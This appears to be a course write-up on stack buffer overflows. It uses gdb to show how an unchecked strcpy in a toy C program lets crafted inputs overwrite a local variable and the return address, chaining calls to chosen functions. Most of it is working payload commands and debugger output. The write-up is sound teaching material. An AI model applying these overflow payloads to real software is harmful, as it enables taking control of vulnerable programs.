# Unit 03 - Smashing the stack

- Compile `silly.c` with `gcc32` function so you can disable security mechanisms and provide `gdb` with debugging symbols.

## Vulnerability

- Looking at `silly.c` and you will see that `strcpy` copies a `str` into `buffer` without even checking the bounds of `buffer`.
- Thus we can easily smash the stack and crash the program

```sh
$ python3 -c 'print("A"*50)' | ./bin/silly
Segmentation fault (core dumped)
```

## Low level details

- Let's run it in `gdb` and explore the stack layout of our `vuln` function:

```sh
$ gdb -q ./bin/silly
Reading symbols from ./bin/silly...
(gdb) b vuln
Breakpoint 1 at 0x80491fe: file silly.c, line 15.
(gdb) r 5 "Hello"
Starting program: function_calling/bin/silly 5 "Hello"
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, vuln (n=5, str=0xffffd2c3 "Hello") at silly.c:15
15        int i = 0;
(gdb) ds
Dump of assembler code for function vuln:
   0x080491ec <+0>:     push   ebp
   0x080491ed <+1>:     mov    ebp,esp
   0x080491ef <+3>:     push   ebx
   0x080491f0 <+4>:     sub    esp,0x34
   0x080491f3 <+7>:     call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491f8 <+12>:    add    ebx,0x2dfc
=> 0x080491fe <+18>:    mov    DWORD PTR [ebp-0xc],0x0
   0x08049205 <+25>:    sub    esp,0x8
   0x08049208 <+28>:    push   DWORD PTR [ebp+0xc]
   0x0804920b <+31>:    lea    eax,[ebp-0x2c]
   0x0804920e <+34>:    push   eax
   0x0804920f <+35>:    call   0x8049050 <strcpy@plt>
   0x08049214 <+40>:    add    esp,0x10
   0x08049217 <+43>:    jmp    0x8049239 <vuln+77>
   0x08049219 <+45>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804921c <+48>:    lea    edx,[eax+0x1]
   0x0804921f <+51>:    mov    DWORD PTR [ebp-0xc],edx
   0x08049222 <+54>:    sub    esp,0x4
   0x08049225 <+57>:    lea    edx,[ebp-0x2c]
   0x08049228 <+60>:    push   edx
   0x08049229 <+61>:    push   eax
   0x0804922a <+62>:    lea    eax,[ebx-0x1fc3]
   0x08049230 <+68>:    push   eax
   0x08049231 <+69>:    call   0x8049040 <printf@plt>
   0x08049236 <+74>:    add    esp,0x10
   0x08049239 <+77>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804923c <+80>:    cmp    eax,DWORD PTR [ebp+0x8]
   0x0804923f <+83>:    jl     0x8049219 <vuln+45>
   0x08049241 <+85>:    nop
   0x08049242 <+86>:    nop
   0x08049243 <+87>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049246 <+90>:    leave
   0x08049247 <+91>:    ret
End of assembler dump.
```

- Immediately I can see `ebp-0xc` is actually the variable `i` because it's set to 0.

```sh
(gdb) x/wx $ebp+0xc
0xffffcfb4:     0xffffd2c3
(gdb) x/x 0xffffd2c3
0xffffd2c3:     0x6c6c6548
(gdb) x/s 0xffffd2c3
0xffffd2c3:     "Hello"
```

- `ebp+0xc` is our second parameter, `str` which we set to `Hello`.
- The `cmp` at the near end of our function can give us a hint what `ebp+0x8` is.

```asm
   0x0804923c <+80>:    cmp    eax,DWORD PTR [ebp+0x8]
```

- Well it's our first parameter, integer `n`.

```sh
(gdb) x/wx $ebp+0x8
0xffffcfb0:     0x00000005
```

- Remember that `strcpy` takes two arguments, first is destination second is the source.
- Pay attention to the assembly instructions:

```asm
   0x08049208 <+28>:    push   DWORD PTR [ebp+0xc]
=> 0x0804920b <+31>:    lea    eax,[ebp-0x2c]
   0x0804920e <+34>:    push   eax
   0x0804920f <+35>:    call   0x8049050 <strcpy@plt>
```

- First `push` is the second argument. Second `push` is our first argument.
- Thus `ebp-0x2c` is the `buffer` we are gonna overflow.
- If you're still sus about it, look at this:

```sh
(gdb) ni 5
(gdb) x/s $ebp-0x2c
0xffffcf7c:     "Hello"
```

- Five instructions later and our `buffer` has `Hello` string which we supplied as the second argument into `vuln`.
- And these are our `ebp` and `esp`:

```sh
(gdb) i r ebp esp
ebp            0xffffcfa8          0xffffcfa8
esp            0xffffcf70          0xffffcf70
```

## Overwriting variables with buffer overflow

- Let's supply an input that is just above the limit `buffer` can hold:

```sh
(gdb) r 5 `python3 -c 'print("A"*33)'`
Starting program: function_calling/bin/silly 5 `python3 -c 'print("A"*33)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, vuln (n=5, str=0xffffd2a7 'A' <repeats 33 times>) at silly.c:15
15        int i = 0;
(gdb) ni 8
21        while( i < n ){
(gdb) p i
$2 = 65
```

- You can see that, `A` (`0x65`) gets written into variable `i`, thus the `while` loop breaks immediately.
- Now try something little bit different:

```sh
(gdb) r 66 `python3 -c 'print("A"*33)'`
Starting program: function_calling/bin/silly 66 `python3 -c 'print("A"*33)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, vuln (n=66, str=0xffffd2a7 'A' <repeats 33 times>) at silly.c:15
15        int i = 0;
(gdb) c
Continuing.
65 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
[Inferior 1 (process 6771) exited normally]
```

- As you can see, it got printed once, that's because now I've set `n` to be to 66, which is greater than 65.
- By the way, notice the `B` in the end of printed output, variable `i` got incremented by one and that's why.
- Let's experiment some more:

```sh
(gdb) r 66 `python3 -c 'print("A"*34)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
[Inferior 1 (process 6815) exited normally]
(gdb) r 66 `python3 -c 'print("A"*35)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
[Inferior 1 (process 6819) exited normally]
(gdb) r 66 `python3 -c 'print("A"*36)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
[Inferior 1 (process 6824) exited normally]
--- snip ---
(gdb) r 66 `python3 -c 'print("A"*43)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
[Inferior 1 (process 6826) exited normally]
(gdb) r 66 `python3 -c 'print("A"*44)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00000307 in ?? ()
```

- After 44th byte, our program SEGFAULTs. And this means we overwrote something important.
- Let's inspect further by setting two breakpoints (at `return` in main and at the beginning of `vuln`):

```sh
(gdb) r 66 `python3 -c 'print("A"*44)'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 3, vuln (n=66, str=0xffffd29c 'A' <repeats 44 times>) at silly.c:15
15        int i = 0;
(gdb) x/x $ebp
0xffffcf88:     0xb8
(gdb) c
Continuing.

Breakpoint 2, main (argc=134529032, argv=0x407) at silly.c:31
31        return 0;
(gdb) x/x $ebp
0xffffcf00:     0x74
```

- At the start of the program `ebp` has memory address `0xffffcf88`.
- At the end of the program `ebp` has memory address `0xffffcf00` and points to `0x74`.
- The last byte got overwritten with `0x00` but why?
- __That's because string of `A`s which we gave into input is null terminated, thus the 45th byte is NULL.__

## Overwriting the return address

- Let's now exploit this vulnerability to overwrite the return address so that it points to whatever we want.
- We know that the return address is stored at `ebp+0x4`, and that means we have to add padding of 48 bytes before we reach the return address.
- Let's verify these facts:

```sh
(gdb) r 66 `python3 -c 'import sys; sys.stdout.buffer.write(b"\x41" * 48 + b"\x41\x42\x43\x44")'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 3, vuln (n=66, str=0xffffd294 'A' <repeats 49 times>, "BCD") at silly.c:15
15        int i = 0;
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) x/x $ebp+0x4
0x41414145:     Cannot access memory at address 0x41414145
```

- Let's change execution to `good` function by overflowing the stack:

```sh
(gdb) r 66 `python3 -c 'import sys; sys.stdout.buffer.write(b"\x41" * 48 + b"\xc1\x91\x04\x08")'`
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, vuln (n=66, str=0xffffd27e 'A' <repeats 48 times>, "\301\221\004\b") at silly.c:15
15        int i = 0;
(gdb) c
Continuing.

Breakpoint 2, vuln (n=0, str=0xffffd27e 'A' <repeats 48 times>, "\301\221\004\b") at silly.c:21
21        while( i < n ){
(gdb) c
Continuing.
The world is yours.

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) c
Continuing.

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
```

- I can also make it point to multiple stuff, function after function, here I've made it call `good` then `bad` then `good` again:

```sh
(gdb) run 66 `python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*48+b"\xc1\x91\x04\x08"+b"\x96\x91\x04\x08"+b"\xc1\x91\x04\x08")'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 2, main (argc=3, argv=0xffffd074) at silly.c:29
29        vuln(atoi(argv[1]), argv[2]);
(gdb) c
Continuing.

Breakpoint 1, vuln (n=66, str=0xffffd28c 'A' <repeats 48 times>, "\301\221\004\b\226\221\004\b\301\221\004\b") at silly.c:15
15        int i = 0;
(gdb) c
Continuing.
The world is yours.
You've been naughty!
The world is yours.

Program received signal SIGSEGV, Segmentation fault.
0xffffff00 in ?? ()
```

- I've wrote `exploit.py` to automate this process.
- This script differs from other scripts I've wrote so far, because this one sends arguments when executing `bin/silly`.

----

#### Sources

1. https://github.com/hoppersroppers/nightmare/blob/master/modules/04-Overflows/unit_03.md
2. https://docs.pwntools.com/en/stable/tubes/processes.html
